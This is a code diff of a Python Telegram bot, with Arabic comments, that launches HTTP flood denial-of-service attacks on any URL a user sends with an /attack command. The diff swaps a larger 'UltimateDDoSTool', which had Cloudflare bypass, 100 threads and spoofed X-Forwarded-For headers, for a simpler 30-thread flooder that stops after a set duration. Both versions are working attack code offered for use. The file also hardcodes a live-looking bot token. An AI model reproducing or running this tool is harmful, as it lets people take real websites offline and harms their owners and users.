@@ -1,130 +1,83 @@
 import random
 import time
 import socket
-import ssl
 import threading
-from urllib.parse import urlparse
-import hashlib
 import telebot
-from telebot import types
-import requests
-from fake_useragent import UserAgent
-import cloudscraper
-import re
+from urllib.parse import urlparse
 
-bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")
+# إعدادات أساسية
+TOKEN = "7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU"
+bot = telebot.TeleBot(TOKEN)
 
-class UltimateDDoSTool:
+class SimpleDDoSTool:
     def __init__(self):
         self.active_attacks = {}
-        self.ua = UserAgent()
-        self.scraper = cloudscraper.create_scraper()
-        self.legal_warning = """
-        ⚠️ تحذير: هذا الكود للأغراض التعليمية فقط
-        ⚠️ استخدامه ضد أنظمة دون إذن غير قانوني
-        """
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)",
+            "Mozilla/5.0 (Linux; Android 10; SM-A505F)"
+        ]
 
-    def _normalize_url(self, url):
-        """تنسيق الروابط بشكل صحيح"""
-        if not re.match(r'^https?://', url):
-            url = 'https://' + url
-        parsed = urlparse(url)
-        return f"{parsed.scheme}://{parsed.netloc}"
-
-    def _bypass_protection(self, url):
-        """تجاوز حماية Cloudflare وغيرها"""
+    def start_attack(self, chat_id, target, duration=60):
+        """بدء هجوم بسيط"""
         try:
-            resp = self.scraper.get(url, timeout=10)
-            return resp.status_code == 200
-        except:
-            return False
-
-    def _generate_headers(self):
-        """إنشاء رؤوس HTTP متغيرة"""
-        return {
-            'User-Agent': self.ua.random,
-            'Accept': 'text/html,application/xhtml+xml',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Referer': 'https://www.google.com/',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'cross-site',
-            'TE': 'trailers'
-        }
-
-    def _advanced_attack(self, target, duration):
-        """تقنية الهجوم المتقدمة"""
-        parsed = urlparse(target)
-        host = parsed.netloc
-        port = 443 if parsed.scheme == 'https' else 80
-        stop_event = threading.Event()
-
-        def worker():
-            ctx = ssl.create_default_context()
-            ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
-            while not stop_event.is_set():
-                try:
-                    with socket.create_connection((host, port), timeout=5) as sock:
-                        if parsed.scheme == 'https':
-                            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
-                                self._send_advanced_request(ssock, host)
-                        else:
-                            self._send_advanced_request(sock, host)
-                    time.sleep(random.uniform(0.1, 1.5))
-                except:
-                    continue
-
-        threads = []
-        for _ in range(100):  # 100 خيط هجومي
-            t = threading.Thread(target=worker)
-            t.daemon = True
-            t.start()
-            threads.append(t)
-
-        return stop_event, threads
-
-    def _send_advanced_request(self, sock, host):
-        """إرسال طلب متطور"""
-        path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
-        headers = self._generate_headers()
-        
-        # بناء طلب HTTP متطور
-        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-        request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
-        request += "\r\nX-Forwarded-For: {}.{}.{}.{}\r\n\r\n".format(
-            random.randint(1, 255), random.randint(0, 255),
-            random.randint(0, 255), random.randint(0, 255)
-        
-        sock.send(request.encode())
-        sock.recv(1024)  # قراءة جزئية للاستجابة
-
-    def start_attack(self, chat_id, url, duration):
-        """بدء هجوم شامل"""
-        try:
-            url = self._normalize_url(url)
+            # تحقق من صحة الرابط
+            if not target.startswith(('http://', 'https://')):
+                target = 'http://' + target
             
-            if not self._bypass_protection(url):
-                return False, "فشل في تجاوز حماية الموقع"
+            parsed = urlparse(target)
+            host = parsed.netloc
+            port = 80  # افتراضي للHTTP
             
-            stop_event, threads = self._advanced_attack(url, duration)
+            if parsed.scheme == 'https':
+                port = 443
+
+            stop_event = threading.Event()
+            threads = []
+
+            def attack():
+                while not stop_event.is_set():
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(3)
+                        s.connect((host, port))
+                        
+                        # بناء طلب بسيط
+                        path = "/" + str(random.randint(1000, 9999))
+                        headers = {
+                            'User-Agent': random.choice(self.user_agents),
+                            'Accept': 'text/html',
+                            'Connection': 'keep-alive'
+                        }
+                        
+                        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+                        for key, value in headers.items():
+                            request += f"{key}: {value}\r\n"
+                        request += "\r\n"
+                        
+                        s.send(request.encode())
+                        time.sleep(0.5)
+                        s.close()
+                    except:
+                        pass
+
+            # بدء 30 خيط هجومي
+            for _ in range(30):
+                t = threading.Thread(target=attack)
+                t.daemon = True
+                t.start()
+                threads.append(t)
+
             self.active_attacks[chat_id] = {
                 'stop_event': stop_event,
-                'threads': threads,
-                'target': url,
-                'start_time': time.time(),
-                'duration': duration
+                'threads': threads
             }
+
+            # إيقاف الهجوم بعد المدة المحددة
+            threading.Timer(duration, self.stop_attack, [chat_id]).start()
             
-            # خيط لإنهاء الهجوم بعد المدة المحددة
-            def timer():
-                time.sleep(duration)
-                self.stop_attack(chat_id)
-            
-            threading.Thread(target=timer).start()
-            
-            return True, f"بدأ الهجوم على {url} لمدة {duration} ثانية"
+            return True, f"بدأ الهجوم على {target} لمدة {duration} ثانية"
+        
         except Exception as e:
             return False, f"خطأ: {str(e)}"
 
@@ -138,56 +91,36 @@ class UltimateDDoSTool:
             return True
         return False
 
-# إنشاء أداة الهجوم
-tool = UltimateDDoSTool()
+# إنشاء الأداة
+tool = SimpleDDoSTool()
 
 # أوامر البوت
-@bot.message_handler(commands=['start', 'help'])
+@bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, tool.legal_warning + """
-    🚀 أوامر البوت:
-    /attack [رابط] [الوقت بالثواني] - بدء هجوم شامل
-    /stop - إيقاف الهجوم الحالي
-    /status - حالة الهجوم الحالي
-    """)
+    bot.reply_to(message, "مرحباً! أوامر البوت:\n/attack [رابط] [وقت]\n/stop")
 
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     try:
-        args = message.text.split()
-        if len(args) < 2:
-            bot.reply_to(message, "استخدم: /attack [رابط] [الوقت بالثواني]")
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "استخدم: /attack [رابط] [وقت]")
             return
         
-        url = args[1]
-        duration = int(args[2]) if len(args) > 2 else 60
+        target = parts[1]
+        duration = int(parts[2]) if len(parts) > 2 else 60
         
-        success, msg = tool.start_attack(message.chat.id, url, duration)
-        bot.reply_to(message, msg)
+        success, response = tool.start_attack(message.chat.id, target, duration)
+        bot.reply_to(message, response)
     except Exception as e:
-        bot.reply_to(message, f"❌ خطأ: {str(e)}")
+        bot.reply_to(message, f"حدث خطأ: {str(e)}")
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(message):
     if tool.stop_attack(message.chat.id):
-        bot.reply_to(message, "✅ تم إيقاف الهجوم بنجاح")
+        bot.reply_to(message, "تم إيقاف الهجوم")
     else:
-        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط لإيقافه")
+        bot.reply_to(message, "لا يوجد هجوم نشط")
 
-@bot.message_handler(commands=['status'])
-def status_cmd(message):
-    if message.chat.id in tool.active_attacks:
-        attack = tool.active_attacks[message.chat.id]
-        elapsed = int(time.time() - attack['start_time'])
-        remaining = max(0, attack['duration'] - elapsed)
-        bot.reply_to(message, f"""
-        🎯 حالة الهجوم:
-        الهدف: {attack['target']}
-        الوقت المنقضي: {elapsed} ثانية
-        الوقت المتبقي: {remaining} ثانية
-        """)
-    else:
-        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط")
-
-print("✅ البوت يعمل...")
+print("البوت يعمل...")
 bot.polling()
